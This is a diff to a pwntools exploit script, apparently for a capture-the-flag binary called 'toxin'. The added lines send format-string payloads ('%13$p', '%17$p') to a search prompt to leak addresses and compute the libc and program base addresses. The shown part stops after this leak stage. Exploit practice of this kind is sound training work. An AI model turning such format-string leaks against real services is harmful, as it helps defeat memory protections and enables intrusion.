@@ -1,6 +1,6 @@
 from pwn import *
 
-#context.log_level = 'debug'
+context.log_level = 'debug'
 
 def detect():
 	for i in range(20):
@@ -14,6 +14,9 @@ def detect():
 #ip, port = 
 #io = remote(ip, port)
 io = process('./toxin')
+
+elf = ELF('./toxin')
+libc = ELF('./lib/libc.so.6')
 
 #detect()
 
@@ -49,5 +52,21 @@ Dump of assembler code for function __libc_start_main:
 '0x11b5'
 
 '''
+
+io.recvuntil('>')
+io.sendline('4')
+io.recvuntil('Enter search term:')
+io.sendline('%13$p')
+libc_start_main = int(io.recvline().strip().split(' ')[0],16)
+libc.address = libc_start_main - libc.sym['__libc_start_main']
+#print hex(libc.address)
+
+io.recvuntil('>')
+io.sendline('4')
+io.recvuntil('Enter search term:')
+io.sendline('%17$p')
+elf_main = int(io.recvline().strip().split(' ')[0],16)
+elf.address = elf_main - elf.sym['main']
+#print hex(elf.address)
 
 
